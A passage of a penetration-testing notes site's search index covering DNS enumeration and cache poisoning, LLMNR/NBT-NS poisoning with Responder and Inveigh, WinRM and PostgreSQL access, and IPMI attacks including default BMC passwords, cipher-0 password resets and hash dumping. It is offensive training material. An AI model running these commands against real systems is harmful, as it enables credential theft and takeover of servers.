etc/resolv.conf","text":"<p>1.1.1.1 is a public DNS resolver operated by Cloudflare that offers a fast and private way to browse the Internet. Unlike most DNS resolvers, 1.1.1.1 does not sell user data to advertisers. In addition, 1.1.1.1 has been measured to be the fastest DNS resolver available.</p> <p>See DNS enumeration</p>","tags":["scanning","domain","subdomain","pentesting"]},{"location":"53-dns/#dns-transfer-zones","title":"DNS transfer zones","text":"<p>See dig axfr. </p>","tags":["scanning","domain","subdomain","pentesting"]},{"location":"53-dns/#dns-server","title":"DNS server","text":"<p>There are many different configuration types for DNS.  All DNS servers work with three different types of configuration files:</p> <ol> <li>local DNS configuration files</li> <li>zone files</li> <li>reverse name resolution files</li> </ol> <p>The DNS server Bind9 is very often used on Linux-based distributions. Its local configuration file (<code>named.conf</code>) is roughly divided into two sections, firstly the options section for general settings and secondly the zone entries for the individual domains. The local configuration files are usually:</p> <ul> <li><code>/etc/bind/named.conf.local</code></li> <li><code>/etc/bind/named.conf.options</code></li> <li><code>/etc/bind/named.conf.log</code></li> </ul> <p>In the file <code>/etc/bind/named.conf.local</code>  we can define the different zones. A <code>zone file</code> is a text file that describes a DNS zone with the BIND file format. In other words it is a point of delegation in the DNS tree. The BIND file format is the industry-preferred zone file format and is now well established in DNS server software. A zone file describes a zone completely. There must be precisely one <code>SOA</code> record and at least one <code>NS</code> record. The SOA resource record is usually located at the beginning of a zone file. The main goal of these global rules is to improve the readability of zone files. A syntax error usually results in the entire zone file being considered unusable. The name server behaves similarly as if this zone did not exist. It responds to DNS queries with a <code>SERVFAIL</code> error message.</p> <p>DNS misconfigurations and vulnerabilities.</p> Option Description <code>allow-query</code> Defines which hosts are allowed to send requests to the DNS server. <code>allow-recursion</code> Defines which hosts are allowed to send recursive requests to the DNS server. <code>allow-transfer</code> Defines which hosts are allowed to receive zone transfers from the DNS server. <code>zone-statistics</code> Collects statistical data of zones. <p>A list of vulnerabilities targeting the BIND9 server can be found at CVEdetails. In addition, SecurityTrails provides a short list of the most popular attacks on DNS servers.</p>","tags":["scanning","domain","subdomain","pentesting"]},{"location":"53-dns/#footprinting-dns","title":"Footprinting DNS","text":"<p>nmap</p> <pre><code>nmap -p53 -Pn -sV -sC $ip\n</code></pre> <p>See nslookup.</p> <pre><code># Query `A` records by submitting a domain name: default behaviour\nnslookup $TARGET\n\n# We can use the `-query` parameter to search specific resource records\n# Querying: A Records for a Subdomain\nnslookup -query=A $TARGET\n\n# Querying: PTR Records for an IP Address\nnslookup -query=PTR 31.13.92.36\n\n# Querying: ANY Existing Records\nnslookup -query=ANY $TARGET\n\n# Querying: TXT Records\nnslookup -query=TXT $TARGET\n\n# Querying: MX Records\nnslookup -query=MX $TARGET\n\n#  Specify a nameserver if needed by adding `@&lt;nameserver/IP&gt;` to the command\n</code></pre> <p>See dig.</p> <pre><code># Dig Version Query\ndig CH TXT version.bind $ip\n\n# View all available records\ndig any example.com @$ip\n # here, $ip refers to ip of DNS server. The more recent RFC8482 specified that `ANY` DNS requests be abolished. Therefore, we may not receive a response to our `ANY` request from the DNS server. Basically, not all entries from the zones will be shown.\n\n# Querying: A Records for a Subdomain\n dig a www.example @$ip\n # here, $ip refers to ip of DNS server\n\n# Get email of administrator of the domain\ndig soa www.example.com\n# The email will contain a (.) dot notation instead of @\n\n# ENUMERATION\n# List nameservers known for that domain\n ns \n# -ns: other name servers are known in NS record\n#  `@` character specifies the DNS server we want to query.\n# here, $ip refers to ip of DNS server\n\n# Display version. query a DNS server's version using a class CHAOS query and type TXT. However, this entry must exist on the DNS server.\ndig CH TXT version.bind $ip\n\n# Querying: PTR Records for an IP Address\ndig -x $ip @1.1.1.1\n\n# Querying: TXT Records\ndig txt example.com @$ip\n\n# Querying: MX Records\ndig mx example.com @1.1.1.1\n</code></pre> <p>Transfer a zone (more on dig axfr)</p> <pre><code>dig axfr example.htb @$ip\n</code></pre> <p>If the administrator used a subnet for the <code>allow-transfer</code> option for testing purposes or as a workaround solution or set it to <code>any</code>, everyone would query the entire zone file at the DNS server.</p> <p>Another tools for transferring zones:</p> <p>Fierce:</p> <pre><code># Perform a dns transfer using a wordlist againts domain.com\nfierce -dns domain.com \n\n# Enumerate all DNS servers of the root domain and scan for a DNS zone transfer:\nfierce --domain zonetransfer.me\n</code></pre> <p>dnsenum:</p> <pre><code>dnsenum domain.com\n# additionally it performs DNS brute force with /usr/share/dnsenum/dns.txt.\n</code></pre>","tags":["scanning","domain","subdomain","pentesting"]},{"location":"53-dns/#subdomain-brute-enumeration","title":"Subdomain brute enumeration","text":"","tags":["scanning","domain","subdomain","pentesting"]},{"location":"53-dns/#bash-command-using-sec-wordlist","title":"Bash command Using Sec wordlist","text":"<pre><code>for sub in $(cat /opt/useful/SecLists/Discovery/DNS/subdomains-top1million-110000.txt);do dig $sub.example.com @$ip | grep -v ';\\|SOA' | sed -r '/^\\s*$/d' | grep $sub | tee -a subdomains.txt;done\n</code></pre>","tags":["scanning","domain","subdomain","pentesting"]},{"location":"53-dns/#dnsenum","title":"dnsenum","text":"<p>dnsenum</p> <pre><code> dnsenum --dnsserver $ip --enum -p 0 -s 0 -o subdomains.txt -f /opt/useful/SecLists/Discovery/DNS/subdomains-top1million-110000.txt inlanefreight.htb\n</code></pre>","tags":["scanning","domain","subdomain","pentesting"]},{"location":"53-dns/#tools-for-passive-enumeration","title":"Tools for passive enumeration","text":"Tool + Cheat sheet What it does Google dorks Google hacking, also named Google dorking, is a hacker technique that uses Google Search and other Google applications to find security holes in the configuration and computer code that websites are using. Sublist3r Sublist3r enumerates subdomains using many search engines such as Google, Yahoo, Bing, Baidu and Ask. Sublist3r also enumerates subdomains using Netcraft, Virustotal, ThreatCrowd, DNSdumpster and ReverseDNS. crt.sh It collects information about SSL certificates. If you visit a domain and it contains a certificate you can extract other subdomain by using the View Certificate functionality. dnscan Python wordlist-based DNS subdomain scanner. DNSRecon Preinstalled with Linux: dsnrecon is a simple python script that enables to gather  DNS-oriented  information on a given target. dnsdumpster.com DNSdumpster.com is a FREE domain research tool that can discover hosts related to a domain. Finding visible hosts from the attackers perspective is an important part of the security assessment process. Subfinder <code>subfinder</code>\u00a0is a subdomain discovery tool that returns valid subdomains for websites, using passive online sources. This tool can scrape subdomains from open sources like\u00a0DNSdumpster. Subbrute SubBrute does not send traffic directly to the target's name servers. This tool allows us to use self-defined resolvers and perform pure DNS brute-forcing attacks during internal penetration tests on hosts that do not have Internet access. viewdns.info domaintools https://www.shodan.io/ https://search.censys.io/","tags":["scanning","domain","subdomain","pentesting"]},{"location":"53-dns/#tools-for-active-enumeration","title":"Tools for active enumeration","text":"Tool + Cheat sheet What it does dnsenum multithreaded perl script to enumerate DNS information of a domain and to discover non-contiguous ip blocks. dig discover non-contiguous ip blocks. fierce DNS scanner that helps locate non-contiguous IP space and hostnames. dnscan Python wordlist-based DNS subdomain scanner. gobuster For brute force enumerations. nslookup . amass In depth DNS Enumeration and network mapping.","tags":["scanning","domain","subdomain","pentesting"]},{"location":"53-dns/#domain-takeover","title":"Domain takeover","text":"<p><code>Domain takeover</code>\u00a0is registering a non-existent domain name to gain control over another domain. Domain takeover is also possible with subdomains called\u00a0<code>subdomain takeover</code>.</p> <p>Subdomain takeover vulnerabilities occur when a subdomain (subdomain.example.com) is pointing to a service (e.g. GitHub pages, Heroku, etc.) that has been removed or deleted. This allows an attacker to set up a page on the service that was being used and point their page to that subdomain.</p> <p>The\u00a0can-i-take-over-xyz\u00a0repository is also an excellent reference for a subdomain takeover vulnerability.</p>","tags":["scanning","domain","subdomain","pentesting"]},{"location":"53-dns/#dns-spoofing-dns-cache-poisoning","title":"DNS spoofing / DNS Cache Poisoning","text":"<p>This attack involves altering legitimate DNS records with false information so that they can be used to redirect online traffic to a fraudulent website.</p>","tags":["scanning","domain","subdomain","pentesting"]},{"location":"53-dns/#ettercap","title":"Ettercap","text":"<p>From a local network perspective, an attacker can also perform DNS Cache Poisoning using MITM tools like\u00a0Ettercap\u00a0or\u00a0Bettercap.</p> <p>1. Edit the\u00a0<code>/etc/ettercap/etter.dns</code>\u00a0file to map the target domain name (e.g.,\u00a0example.com) that they want to spoof and the attacker's IP address ($IPAttacker) that they want to redirect a user to.</p> <p>Next, start the\u00a0<code>Ettercap</code>\u00a0tool and scan for live hosts within the network by navigating to\u00a0<code>Hosts &gt; Scan for Hosts</code>. Once completed, add the target IP address ($ipTarget) to Target1 and add a default gateway IP (e.g.,\u00a0<code>192.168.152.2</code>) to Target2.</p> <p>Activate\u00a0<code>dns_spoof</code>\u00a0attack by navigating to\u00a0<code>Plugins &gt; Manage Plugins</code>. This sends the target machine with fake DNS responses that will resolve\u00a0<code>inlanefreight.com</code>\u00a0to IP address\u00a0$ipAttacker.</p> <p>After a successful DNS spoof attack, if a victim user coming from the target machine\u00a0$ipTarget\u00a0visits the\u00a0<code>inlanefreight.com</code>\u00a0domain on a web browser, they will be redirected to a\u00a0fake page\u00a0that is hosted on IP address\u00a0$ipAttacker. Also incoming pings will be resolved to $ipAttacker</p>","tags":["scanning","domain","subdomain","pentesting"]},{"location":"5355-LLMNR/","title":"LLMNR/NBT-NS Poisoning","text":"<p>Link-Local Multicast Name Resolution\u00a0(LLMNR) and\u00a0NetBIOS Name Service\u00a0(NBT-NS) are Microsoft Windows components that serve as alternate methods of host identification that can be used when DNS fails.</p> <p>If a machine attempts to resolve a host but DNS resolution fails, typically, the machine will try to ask all other machines on the local network for the correct host address via LLMNR. LLMNR is based upon the Domain Name System (DNS) format and allows hosts on the same local link to perform name resolution for other hosts.</p> <p>It uses port\u00a0<code>5355</code>\u00a0over UDP natively. If LLMNR fails, the NBT-NS will be used. NBT-NS identifies systems on a local network by their NetBIOS name. NBT-NS utilizes port\u00a0<code>137</code>\u00a0over UDP.</p> <p>The kicker here is that when LLMNR/NBT-NS are used for name resolution, ANY host on the network can reply. This is where we come in with\u00a0<code>Responder</code>\u00a0to poison these requests.</p>","tags":["pentesting","pentesting","port","5355"]},{"location":"5355-LLMNR/#how-does-a-typical-attack-work","title":"How does a typical attack work","text":"<ol> <li>A host attempts to connect to the print server at \\print01.inlanefreight.local, but accidentally types in \\printer01.inlanefreight.local.</li> <li>The DNS server responds, stating that this host is unknown.</li> <li>The host then broadcasts out to the entire local network asking if anyone knows the location of \\printer01.inlanefreight.local.</li> <li>The attacker (us with\u00a0<code>Responder</code>\u00a0running) responds to the host stating that it is the \\printer01.inlanefreight.local that the host is looking for.</li> <li>The host believes this reply and sends an authentication request to the attacker with a username and NTLMv2 password hash.</li> <li>This hash can then be cracked offline or used in an SMB Relay attack if the right conditions exist.</li> </ol>","tags":["pentesting","pentesting","port","5355"]},{"location":"5355-LLMNR/#tools","title":"Tools","text":"<p>Several tools can be used to attempt LLMNR &amp; NBT-NS poisoning:</p> Tool Description Responder Responder is a purpose-built tool to poison LLMNR, NBT-NS, and MDNS, with many different functions. Inveigh Inveigh is a cross-platform MITM platform that can be used for spoofing and poisoning attacks. Metasploit Metasploit has several built-in scanners and spoofing modules made to deal with poisoning attacks.","tags":["pentesting","pentesting","port","5355"]},{"location":"5355-LLMNR/#from-linux","title":"From Linux","text":"","tags":["pentesting","pentesting","port","5355"]},{"location":"5355-LLMNR/#responder","title":"Responder","text":"<p>Listening with responder</p> <pre><code>sudo responder -I ens224 -A -wf\n# sudo privileges or root to make sure that all ports needed are available on our attack host for it to function best.\n# -w: The use of the -w flag utilizes the built-in WPAD proxy server. This can be highly effective, especially in large organizations, because it will capture all HTTP requests by any users that launch Internet Explorer if the browser has Auto-detect settings enabled.\n# -f: attempts to fingerprint the remote host operating system and version.\n</code></pre> <p>With this configuration shown above, Responder will listen and answer any requests it sees on the wire.</p> <p>All saved Hashes are located in Responder's logs directory (<code>/usr/share/responder/logs/</code>). </p> <p>NetNTLMv2 hashes are very useful once cracked, but cannot be used for techniques such as pass-the-hash, meaning we have to attempt to crack them offline with hashcat or johntheripper. For example, in the case of a  NetNTLMv2 hash, we can copy the hash to a file and attempt to crack it using the hashcat module 5600. </p> <pre><code>hashcat -m 5600 forend_ntlmv2 /usr/share/wordlists/rockyou.txt \n</code></pre> <p>See hashcat for other modules beside 5600.</p> <p>Hashes are also stored in a SQLite database that can be configured in the\u00a0<code>Responder.conf</code>\u00a0config file, typically located in\u00a0<code>/usr/share/responder</code>\u00a0unless we clone the Responder repo directly from GitHub.</p>","tags":["pentesting","pentesting","port","5355"]},{"location":"5355-LLMNR/#from-windows","title":"From Windows","text":"","tags":["pentesting","pentesting","port","5355"]},{"location":"5355-LLMNR/#inveigh","title":"Inveigh","text":"<p>https://github.com/Kevin-Robertson/Inveigh</p> <p>Mitre ATT&amp;CK lists this technique as\u00a0ID: T1557.001,\u00a0<code>Adversary-in-the-Middle: LLMNR/NBT-NS Poisoning and SMB Relay</code>.</p> <p>LLMNR &amp; NBT-NS poisoning is possible from a Windows host as well. </p> <p>Inveigh is a cross-platform .NET IPv4/IPv6 machine-in-the-middle tool for penetration testers. The repo contains the primary C# version as well as the legacy PowerShell version.</p> <p>Inveigh can listen to IPv4 and IPv6 and several other protocols, including\u00a0<code>LLMNR</code>, DNS,\u00a0<code>mDNS</code>, NBNS,\u00a0<code>DHCPv6</code>, ICMPv6,\u00a0<code>HTTP</code>, HTTPS,\u00a0<code>SMB</code>, LDAP,\u00a0<code>WebDAV</code>, and Proxy Auth.</p>","tags":["pentesting","pentesting","port","5355"]},{"location":"5355-LLMNR/#powershell-version","title":"Powershell version","text":"<p>The PowerShell version of Inveigh is the original version and is no longer updated. The tool author maintains the C# version (in the belowed section). Configurable parameters in inveigh: https://github.com/Kevin-Robertson/Inveigh/wiki/Parameters</p> <pre><code># Install the module\nImport-Module .\\Inveigh.ps1\n\n# List parameters\n(Get-Command Invoke-Inveigh).Parameters\n\n# Start Inveigh with LLMNR and NBNS spoofing, and output to the console and write to a file.\nInvoke-Inveigh Y -NBNS Y -ConsoleOutput Y -FileOutput Y\n</code></pre>","tags":["pentesting","pentesting","port","5355"]},{"location":"5355-LLMNR/#c-inveigh-inveighzero","title":"C# Inveigh (InveighZero)","text":"<p>Before we can use the C# version of the tool, we have to compile the executable. </p> <pre><code>.\\Inveigh.exe\n</code></pre> <p>Results:</p> <pre><code>[*] Inveigh 2.0.4 [Started 2022-02-28T20:03:28 | PID 6276]\n[+] Packet Sniffer Addresses [IP 172.16.5.25 | IPv6 fe80::dcec:2831:712b:c9a3%8]\n[+] Listener Addresses [IP 0.0.0.0 | IPv6 ::]\n[+] Spoofer Reply Addresses [IP 172.16.5.25 | IPv6 fe80::dcec:2831:712b:c9a3%8]\n[+] Spoofer Options [Repeat Enabled | Local Attacks Disabled]\n[ ] DHCPv6\n[+] DNS Packet Sniffer [Type A]\n[ ] ICMPv6\n[+] LLMNR Packet Sniffer [Type A]\n[ ] MDNS\n[ ] NBNS\n[+] HTTP Listener [HTTPAuth NTLM | WPADAuth NTLM | Port 80]\n[ ] HTTPS\n[+] WebDAV [WebDAVAuth NTLM]\n[ ] Proxy\n[+] LDAP Listener [Port 389]\n[+] SMB Packet Sniffer [Port 445]\n[+] File Output [C:\\Tools]\n[+] Previous Session Files (Not Found)\n[*] Press ESC to enter/exit interactive console\n[!] Failed to start HTTP listener on port 80, check IP and port usage.\n[!] Failed to start HTTPv6 listener on port 80, check IP and port usage.\n[ ] [20:03:31] mDNS(QM)(A) request [academy-ea-web0.local] from 172.16.5.125 [disabled]\n[ ] [20:03:31] mDNS(QM)(AAAA) request [academy-ea-web0.local] from 172.16.5.125 [disabled]\n[ ] [20:03:31] mDNS(QM)(A) request [academy-ea-web0.local] from fe80::f098:4f63:8384:d1d0%8 [disabled]\n[ ] [20:03:31] mDNS(QM)(AAAA) request [academy-ea-web0.local] from fe80::f098:4f63:8384:d1d0%8 [disabled]\n[+] [20:03:31] LLMNR(A) request [academy-ea-web0] from 172.16.5.125 [response sent]\n[-] [20:03:31] LLMNR(AAAA) request [academy-ea-web0] from 172.16.5.125 [type ignored]\n[+] [20:03:31] LLMNR(A) request [academy-ea-web0] from fe80::f098:4f63:8384:d1d0%8 [response sent]\n[-] [20:03:31] LLMNR(AAAA) request [academy-ea-web0] from \n</code></pre> <ul> <li><code>[+]</code>\u00a0 default option and enabled by default</li> <li><code>[ ]</code>\u00a0 disabled options .</li> </ul> <p>Console access: </p> <p>Press ESC to enter/exit interactive console. The console gives us access to captured credentials/hashes, allows us to stop Inveigh, and more.</p> <pre><code># List commands\n&gt; HELP\n\n# view unique captured hashes\n&gt; \u00a0GET NTLMV2UNIQUE\n\n#  see which usernames we have collected.\nGET NTLMV2USERNAMES\n</code></pre>","tags":["pentesting","pentesting","port","5355"]},{"location":"5432-postgresql/","title":"5432 postgreSQL","text":"<p>https://book.hacktricks.xyz/network-services-pentesting/pentesting-postgresql.</p>","tags":["postgresql","port 5432"]},{"location":"5432-postgresql/#description","title":"Description","text":"<p>In some cases, the default service that runs on TCP port 5432 is PostgreSQL, which is a database management system: creating, modifying, and updating databases, changing and adding data, and more. PostgreSQL can typically be interacted with using a command-line tool called psql.</p> <pre><code>psql\n</code></pre>","tags":["postgresql","port 5432"]},{"location":"5432-postgresql/#installation","title":"Installation","text":"","tags":["postgresql","port 5432"]},{"location":"5432-postgresql/#linux","title":"Linux","text":"<p>If the tool is not installed, then run:</p> <pre><code>sudo apt install postgresql-client-common\n</code></pre> <p>If your user is not in the sudoers file, we can do some workarounds about it. Some options arise here:</p> <p>-uploading static binaries onto the target machine, -port-forwarding, or tunneling, using SSH.</p> <p>Using SSH and postgresql:</p> <p>1. In the attacking machine:</p> <pre><code>ssh UserNameInTheAttackedMachine@IPOfTheAttackedMachine -L 1234:localhost:5432 \n# We will listen for incoming connections on our local port 1234. When a client connects to our local port, the SSH client will forward the connection to the remote server on port 22. This allows the local client to access services on the remote server as if they were running on the local machine.\n# We are forwarding traffic from any given local port, for instance 1234, to the port on which PostgreSQL is listening, namely 5432, on the remote server. We therefore specify port 1234 to the left of localhost, and 5432 to the right, indicating the target port.\n</code></pre> <p>2. In another terminal in the attacking machine:</p> <pre><code>sudo apt update &amp;&amp; sudo apt install postgresql postgresql-client-common \n# this will install postgresql in case you don't have it.\n\npsql -U christine -h localhost -p 1234\n# Using our installation of psql, we can now interact with the PostgreSQL service running locally on the target machine:\n# -U: to specify user.\n# -h: to specify localhost. \n# -p 1234 as we are targeting the tunnel we created earlier with SSH, we need to specify which is the port the tunnel is listening on.\n</code></pre>","tags":["postgresql","port 5432"]},{"location":"5432-postgresql/#powershell","title":"Powershell","text":"<pre><code>Install-Module PostgreSQLCmdlets\n</code></pre>","tags":["postgresql","port 5432"]},{"location":"5432-postgresql/#basics-commands-in-postgresql","title":"Basics commands in postgresql","text":"<pre><code># List databases\n# Short version: \\l\n\\list\n\n# Connect to a database\n# Short version: \\c NameOfDataBase\n\\connect NameOfDatabase\n\n# List database tables (once you have selected a database)\n\\dt\n\n# Dump content from a column\nSELECT * FROM NameOfColumn;\n# Watch out! Case sensitive\n</code></pre>","tags":["postgresql","port 5432"]},{"location":"55007-55008-dovecot/","title":"55007 - 55008 dovecot","text":"","tags":["dovecot","port 55007","port 55008"]},{"location":"55007-55008-dovecot/#dovecot","title":"dovecot","text":"<p>You can connect with a dovecot server using the telnet protocol.</p> <pre><code>telnet IP port\n# Example: telnet 192.168.56.101 55007\n</code></pre>","tags":["dovecot","port 55007","port 55008"]},{"location":"55007-55008-dovecot/#basic-commands","title":"Basic commands","text":"<pre><code># Enter the username to login\nUSER username\n\n# Enter password\nPASS secretword\n\n# Now, you are logged in and you can list message on the server for that user\nLIST\n\n# And you can read them using their id (id is a number=\nRETR id\n\n# You might be able to delete them\nDELE id\n</code></pre>","tags":["dovecot","port 55007","port 55008"]},{"location":"5985-5986-winrm-windows-remote-management/","title":"Port 5985, 5986 - Windows Remote Management (WinRM)","text":"<p>How is WinRM different from Remote Desktop (RDP)? WinRM is a protocol for remote management, while Remote Desktop (RDP) is a protocol for remote desktop access. WinRM allows for remote execution of management commands, while RDP provides a graphical interface for remote desktop access.</p> <p>WinRM is part of the operating system. However, to obtain data from remote computers, you must configure a WinRM listener.</p> <p>WinRM is a network protocol based on XML web services using the Simple Object Access Protocol (<code>SOAP</code>) used for remote management of Windows systems. It takes care of the communication between Web-Based Enterprise Management (<code>WBEM</code>) and the Windows Management Instrumentation (<code>WMI</code>), which can call the Distributed Component Object Model (<code>DCOM</code>). WinRM uses the Simple Object Access Protocol (<code>SOAP</code>) to establish connections to remote hosts and their applications. However, for security reasons, WinRM must be activated and configured manually in Windows 10. WinRM uses the TCP ports <code>5985</code> (<code>HTTP</code>) and <code>5986</code> (<code>HTTPS</code>).</p> <p>Another component that fits WinRM for administration is Windows Remote Shell (<code>WinRS</code>), which lets us execute arbitrary commands on the remote system. The program is even included on Windows 7 by default.</p>","tags":["tools","port","5985","port","5986","winrm"]},{"location":"5985-5986-winrm-windows-remote-management/#footprinting-winrm","title":"Footprinting winrm","text":"<p>As we already know, WinRM uses TCP ports 5985 (HTTP) and 5986 (HTTPS) by default, which we can scan using Nmap:</p> <pre><code>nmap -sV -sC $ip -p5985,5986 --disable-arp-ping -n\n</code></pre>","tags":["tools","port","5985","port","5986","winrm"]},{"location":"5985-5986-winrm-windows-remote-management/#connect-to-a-machine","title":"Connect to a machine","text":"","tags":["tools","port","5985","port","5986","winrm"]},{"location":"5985-5986-winrm-windows-remote-management/#from-linux","title":"From Linux","text":"<p>See evil-winrm.</p> <p>We'll connect to the WinRM service on the target and try to get a session. Because PowerShell isn't installed on Linux by default, we'll use a tool called Evil-WinRM  which is made for this kind of scenario.</p> <pre><code>evil-winrm -i $ip -u &lt;username&gt; -p &lt;password&gt;\n</code></pre>","tags":["tools","port","5985","port","5986","winrm"]},{"location":"5985-5986-winrm-windows-remote-management/#from-windows","title":"From Windows","text":"<p>For windows, we can use The Test-WsMan cmdlet.</p> <p>Also we can access  with Powershell and the Enter-PSSession\u00a0cmdlet:</p> <pre><code># Create a SecureString object_\n$password = ConvertTo-SecureString \"$passwordOfUser\" -AsPlainText -Force\n$cred = new-object System.Management.Automation.PSCredential (\"$domain\\$userSamAccountName\", $password)\n\n# Access the host\nEnter-PSSession -ComputerName $hostName -Credential $cred\n\n#####\n# Example:\n# $password = ConvertTo-SecureString \"Klmcargo2\" -AsPlainText -Force\n# $cred = new-object System.Management.Automation.PSCredential (\"INLANEFREIGHT\\forend\", $password)\n# Enter-PSSession -ComputerName ACADEMY-EA-MS01 -Credential $cred\n</code></pre>","tags":["tools","port","5985","port","5986","winrm"]},{"location":"623-1900-intelligent-platform-management-interface-ipmi/","title":"Ports 623, 1900 - Intelligent Platform Management Interface (IPMI)","text":"<p>Intelligent Platform Management Interface (IPMI) is a system management tool that provides sysadmins with the ability to manage and monitor systems even if they are powered off or in an unresponsive state.  It operates using a direct network connection to the system's hardware and does not require access to the operating system via a login shell. IPMI can also be used for remote upgrades to systems without requiring physical access to the target host. </p> <p>Default Port: 623/UDP/TCP (It's usually on UDP but it could also be running on TCP). PMI is typically used in three ways:</p> <ul> <li>Before the OS has booted to modify BIOS settings</li> <li>When the host is fully powered down</li> <li>Access to a host after a system failure</li> </ul>","tags":["intelligent platform management interface","port 623","ipmi","bcm"]},{"location":"623-1900-intelligent-platform-management-interface-ipmi/#footprinting-ipmi","title":"Footprinting ipmi","text":"<p>Many Baseboard Management Controllers (BMCs) (including HP iLO, Dell DRAC, and Supermicro IPMI) expose a web-based management console, some sort of command-line remote access protocol such as Telnet or SSH, and the port 623 UDP, which, again, is for the IPMI network protocol.</p>","tags":["intelligent platform management interface","port 623","ipmi","bcm"]},{"location":"623-1900-intelligent-platform-management-interface-ipmi/#discovery","title":"Discovery","text":"<pre><code>nmap -n -p 623 $ip/24\nnmap -n -sU -p 623 $ip/24\n\n#run all nmap scripts related to ipmi protocol\nsudo nmap -sU --script ipmi* -p 623 $ip\n\nuse  auxiliary/scanner/ipmi/ipmi_version\n</code></pre>","tags":["intelligent platform management interface","port 623","ipmi","bcm"]},{"location":"623-1900-intelligent-platform-management-interface-ipmi/#version","title":"Version","text":"<pre><code>sudo nmap -sU --script ipmi-version -p 623 $ip\n</code></pre> <p>Metasploit scanner module IPMI Information Discovery (auxiliary/scanner/ipmi/ipmi_version): this module discovers host information through IPMI Channel Auth probes:</p> <pre><code>use auxiliary/scanner/ipmi/ipmi_version\n\nshow actions ...actions... msf \nset ACTION &lt; action-name &gt; msf \nshow options \n# and set needed options\nrun\n</code></pre> <p>We might find BMCs where the administrators have not changed the default password:</p> Product Username Password Dell Remote Access Card (iDRAC, DRAC) root calvin HP Integrated Lights Out (iLO) Administrator randomized 8-character string consisting of numbers and uppercase letters Supermicro IPMI (2.0) ADMIN ADMIN IBM Integrated Management Module (IMM) USERID PASSW0RD (with a zero) Fujitsu Integrated Remote Management Controller admin admin Oracle/Sun Integrated Lights Out Manager (ILOM) root changeme ASUS iKVM BMC admin admin <p>These default passwords may gain us access to the web console or even command line access via SSH or Telnet.</p>","tags":["intelligent platform management interface","port 623","ipmi","bcm"]},{"location":"623-1900-intelligent-platform-management-interface-ipmi/#vulnerability-ipmi-authentication-bypass-via-cipher-0","title":"Vulnerability - IPMI Authentication Bypass via Cipher 0","text":"<p>Dan Farmer identified a serious failing of the IPMI 2.0 specification, namely that cipher type 0, an indicator that the client wants to use clear-text authentication, actually allows access with any password. Cipher 0 issues were identified in HP, Dell, and Supermicro BMCs, with the issue likely encompassing all IPMI 2.0 implementations.</p> <pre><code>use auxiliary/scanner/ipmi/ipmi_cipher_zero\n</code></pre> <p>Abuse this flaw with <code>ipmitool</code>:</p> <pre><code># Install\napt-get install ipmitool \n\n# Use Cipher 0 to dump a list of users. With -C 0 any password is accepted\nipmitool -I lanplus -C 0 -H $ip -U root -P root user list \n\n# Change the password of root\nipmitool -I lanplus -C 0 -H $ip -U root -P root user set password 2 abc123 \n</code></pre>","tags":["intelligent platform management interface","port 623","ipmi","bcm"]},{"location":"623-1900-intelligent-platform-management-interface-ipmi/#ipmi-20-rakp-remote-sha1-password-hash-retrieval","title":"IPMI 2.0 RAKP Remote SHA1 Password Hash Retrieval","text":"<p>If default credentials do not work to access a BMC, we can turn to a flaw in the RAKP protocol in IPMI 2.0. During the authentication process, the server sends a salted SHA1 or MD5 hash of the user's password to the client before authentication takes place.</p> <p>Metasploit module:</p> <p>This module identifies IPMI 2.0-compatible systems and attempts to retrieve the HMAC-SHA1 password hashes of default usernames. The hashes can be stored in a file using the OUTPUT_FILE option and then cracked using hmac_sha1_crack.rb in the tools subdirectory as well hashcat (cpu) 0.46 or newer using type 7300. </p> <pre><code>use auxiliary/scanner/ipmi/ipmi_dumphashes\n\nshow actions\n\nset ACTION &lt; action-name &gt;\n\nshow options\n# set &lt;options&gt;\n\nrun\n</code></pre> <p>Hashcat: </p> <pre><code>hashcat -m 7300 ipmi.txt -a 3 ?1?1?1?1?1?1?1?1 -1 ?d?u\n</code></pre>","tags":["intelligent platform management interface","port 623","ipmi","bcm"]},{"location":"623-1900-intelligent-platform-management-interface-ipmi/#ipmi-anonymous-authentication","title":"IPMI Anonymous Authentication","text":"<p>A default configuration in many BMCs allows \"anonymous\" access, characterized by null username and password strings. This configuration can be exploited to reset passwords of named user accounts using <code>ipmitool</code>:</p> <pre><code>ipmitool -I lanplus -H $ip -U '' -P '' user list\nipmitool -I lanplus -H $ip -U '' -P '' user set password 2 newpassword\n</code></pre>","tags":["intelligent platform management interface","port 623","ipmi","bcm"]},{"location":"623-1900-intelligent-platform-management-interface-ipmi/#supermicro-ipmi-clear-text-passwords","title":"Supermicro IPMI Clear-text Passwords","text":"<p>Supermicro's inclusion of a UPnP SSDP listener in its IPMI firmware, particularly on UDP port 1900, introduces a severe security risk. Vulnerabilities in the Intel SDK for UPnP Devices version 1.3.1, as detailed by Rapid7's disclosure, allow for root access to the BMC:</p> <pre><code>msf&gt; use exploit/multi/upnp/libupnp_ssdp_overflow\n</code></pre>","tags":["intelligent platform management interface","port 623","ipmi","bcm"]},{"location":"623-1900-intelligent-platform-management-interface-ipmi/#how-does-ipmi-work","title":"How does IPMI work","text":"<p>IPMI can monitor a range of different things such as system temperature, voltage, fan status, and power supplies. It can also be used for querying inventory information, reviewing hardware logs, and alerting using SNMP. The host system can be powered off, but the IPMI module requires a power source and a LAN connection to work correctly.</p> <p>Systems using IPMI version 2.0 can be administered via serial over LAN, giving sysadmins the ability to view serial console output in band. To function, IPMI requires the following components:</p> <ul> <li>Baseboard Management Controller (BMC) - A micro-controller and essential component of an IPMI</li> <li>Intelligent Chassis Management Bus (ICMB) - An interface that permits communication from one chassis to another</li> <li>Intelligent Platform Management Bus (IPMB) - extends the BMC</li> <li>IPMI Memory - stores things such as the system event log, repository store data, and more</li> <li>Communications Interfaces - local system interfaces, serial and LAN interfaces, ICMB and PCI Management Bus.</li> </ul> <p>Baseboard Management Controllers (BMCs): Systems that use the IPMI protocol.</p> <p>BMCs are built into many motherboards but can also be added to a system as a PCI card (Peripheral Component Interconnect (PCI) is a local computer bus for attaching hardware devices in a computer and is part of the\u00a0PCI\u00a0Local Bus standard.) Most servers either come with a BMC or support adding a BMC. The most common BMCs we often see during internal penetration tests are HP iLO, Dell DRAC, and Supermicro IPMI.</p> <p>If we can access a BMC during an assessment, we would gain full access to the host motherboard and be able to monitor, reboot, power off, or even reinstall the host operating system. Gaining access to a BMC is nearly equivalent to physical access to a system.</p>","tags":["intelligent platform management interface","port 623","ipmi","bcm"]},{"location":"623-1900-intelligent-platform-management-interface-ipmi/#resources","title":"Resources","text":"<ul> <li>hacktricks: https://book.hacktricks.xyz/network-services-pentesting/623-udp-ipmi</li> </ul>","tags":["intelligent platform management interface","port 623","ipmi","bcm"]},{"location":"6379-redis/","title":"6379 